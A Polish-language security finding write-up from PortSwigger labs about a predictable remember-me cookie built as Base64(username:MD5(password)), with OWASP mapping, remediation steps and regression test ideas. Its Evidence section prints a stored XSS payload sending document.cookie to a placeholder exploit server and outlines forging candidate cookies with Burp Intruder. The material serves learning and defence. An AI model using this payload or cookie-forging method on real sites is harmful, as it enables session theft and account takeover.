# Przykładowe znalezisko: słabe cookie remember-me używa przewidywalnej wartości pochodzącej od hasła

## Podsumowanie

Aplikacja używa słabego formatu cookie remember-me opartego o username i hash MD5 hasła użytkownika.

Cookie jest zakodowane Base64, ale Base64 nie jest szyfrowaniem. Po zdekodowaniu cookie ujawnia przewidywalną strukturę podobną do:

```text
username:MD5(password)
```

Pozwala to atakującemu zrozumieć format tokenu, przeprowadzić offline password cracking albo wygenerować candidate remember-me cookies przy użyciu listy haseł.

To znalezisko bazuje na labach PortSwigger Web Security Academy i jest zapisane jako przykład edukacyjny.

## Dotknięty obszar

Dotknięty obszar:

```text
Persistent login / remember-me functionality
Cookie: stay-logged-in
```

Zaobserwowany słaby wzorzec:

```text
stay-logged-in = Base64(username:MD5(password))
```

Wartości wrażliwe z laba są celowo zredagowane.

## OWASP Mapping

```text
OWASP Top 10 2025: A04 - Cryptographic Failures
```

Powiązane typy słabości:

```text
Weak token design
Weak password-derived cookie value
Use of weak hash for password-related protection
Predictable authentication token
Encoding used as if it provided protection
```

Powiązane problemy wspierające z pierwszego laba:

```text
Missing HttpOnly on sensitive cookie
Stored XSS enabling cookie exfiltration
```

## Severity

**High**

Problem może prowadzić do account takeover, gdy format cookie da się zdekodować, odtworzyć, ukraść albo brute-force'ować.

Severity zależy od realnego kontekstu aplikacji, czasu życia tokenu, siły haseł, rate limiting, flag cookie i obecności innych problemów, takich jak XSS.

## Ryzyko / wpływ

Atakujący może być w stanie:

- zdekodować cookie i zrozumieć jego strukturę,
- rozpoznać, że zawiera hash pochodzący od hasła,
- łamać słabe hasła offline,
- generować candidate cookies dla innego użytkownika,
- uwierzytelnić się jako inny użytkownik, jeśli wygenerowane cookie zostanie zaakceptowane,
- kraść browser-readable cookies przez XSS, jeśli brakuje `HttpOnly`,
- utrzymać nieautoryzowany dostęp, jeśli tokeny remember-me są long-lived i nieodwoływalne.

Pierwszy lab pokazał łańcuch, w którym stored XSS i brak `HttpOnly` pozwoliły ukraść cookie remember-me ofiary i złamać hash offline.

Drugi lab pokazał, że znajomość formatu tokenu pozwala generować candidate cookies przy użyciu Burp Intruder.

## Root Cause

Przyczyną źródłową jest słaby projekt persistent-login token.

Zamiast wydać losowy token walidowany po stronie serwera, aplikacja tworzy przewidywalny token z użyciem:

```text
username + MD5(password)
```

a potem koduje go Base64.

Czynniki wspierające:

- Base64 mylone z ochroną,
- MD5 użyte w kontekście związanym z hasłem,
- wartość pochodząca od hasła wysłana do przeglądarki,
- format tokenu przewidywalny i odtwarzalny,
- cookie czytelne dla JavaScript w pierwszym labie, bo brakowało `HttpOnly`,
- brak mocnego server-side opaque token design.

## Evidence

### Zdekodowana struktura cookie

Cookie remember-me zostało zdekodowane z Base64 i ujawniło strukturę podobną do:

```text
wiener:<md5-password-hash>
```

Wskazywało to na format:

```text
Base64(username:MD5(password))
```

### Łańcuch kradzieży cookie

W pierwszym labie cookie było czytelne dla JavaScript, bo `HttpOnly` nie było ustawione.

Payload stored XSS mógł wysłać `document.cookie` do exploit server:

```html
<script>
new Image().src='https://<exploit-server>/exploit?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Cookie ofiary można było potem zdekodować, a hash MD5 złamać offline.

### Generowanie candidate cookies w Burp Intruder

W drugim labie candidate cookies zostały wygenerowane w Burp Intruder.

Payload processing przekształcał każde hasło-kandydata:

```text
candidate password
    -> MD5(candidate password)
    -> add prefix: carlos:
    -> Base64 encode final value
```

Poprawna odpowiedź pokazała:

```html
<p>Your username is: carlos</p>
```

To potwierdziło, że wygenerowane cookie zostało zaakceptowane jako poprawny token remember-me.

## Oczekiwane bezpieczne zachowanie

Cookie remember-me nie powinno zawierać:

- username plus hash hasła,
- hasha MD5,
- wartości pochodzących od hasła,
- czytelnych informacji o użytkowniku,
- przewidywalnej struktury tokenu.

Bezpieczniejszy projekt powinien używać:

- długiego losowego tokenu o wysokiej entropii,
- walidacji tokenu po stronie serwera,
- przechowywania hasha tokenu po stronie serwera,
- expiry,
- revocation,
- rotacji tam, gdzie ma to sens,
- `HttpOnly`,
- `Secure`,
- odpowiedniego `SameSite`.

## Remediation

Zalecana remediacja:

1. Zastąpić `Base64(username:MD5(password))` losowym opaque remember-me token.
2. Przechowywać po stronie serwera tylko zahashowaną wersję tokenu.
3. Powiązać token z użytkownikiem i opcjonalnie metadanymi urządzenia/sesji.
4. Dodać expiry tokenu.
5. Dodać revocation na logout i zmianę hasła.
6. Rotować tokeny po wrażliwych zdarzeniach tam, gdzie ma to sens.
7. Ustawić `HttpOnly`, jeśli JavaScript nie musi czytać cookie.
8. Ustawić `Secure`, aby cookie było wysyłane tylko po HTTPS.
9. Ustawić odpowiednie `SameSite` zgodnie z potrzebami aplikacji.
10. Usunąć użycie MD5 dla ochrony związanej z hasłami.
11. Naprawić każdy XSS, który może czytać dane dostępne w przeglądarce.
12. Unieważnić istniejące słabe tokeny remember-me po wdrożeniu poprawki.

## Pomysły na testy regresji

Dodać testy, które potwierdzają:

```text
Cookie remember-me nie dekoduje się z Base64 do username:hash.
Cookie remember-me nie zawiera MD5(password).
Wygenerowane cookies Base64(username:MD5(candidate-password)) są odrzucane.
Cookie używa HttpOnly, Secure i odpowiedniego SameSite.
Token wygasa.
Logout odwołuje token.
Zmiana hasła odwołuje stare tokeny remember-me.
JavaScript nie może odczytać cookie remember-me przez document.cookie.
```

Szczegółowe przypadki regresji są zapisane w [04-regression-tests.md](../04-regression-tests.md).

## OWASP Mapping Details

Główne mapowanie:

- OWASP Top 10 2025 A04 Cryptographic Failures

Powiązane obszary:

- Authentication/session management
- Zmniejszanie impactu XSS przez flagi cookie
- Bezpieczne generowanie tokenów
- Review hashowania haseł

## Developer takeaway

Token, który wygląda na zakodowany albo losowy, nie jest automatycznie bezpieczny.

Jeśli token można zdekodować do znaczącej struktury albo odtworzyć ze znanych danych wejściowych, nie powinien być uznawany za bezpieczny authentication token.

Cookie remember-me powinno być opaque random token walidowanym po stronie serwera, a nie paczką po stronie klienta zawierającą username i hash hasła.

## Refleksja z nauki

Ten lab pomógł mi zrozumieć różnicę między:

- encoding,
- hashing,
- encryption,
- bezpiecznym projektem tokenu.

Pokazał też, że testowanie AppSec często oznacza debugowanie łańcucha krok po kroku. W pierwszym labie musiałem potwierdzić, że payload XSS się wykonuje, zanim próbowałem eksfiltrować cookies. W drugim labie nauczyłem się, jak Burp Intruder może przekształcać payloady przez MD5, prefixy i Base64 encoding.
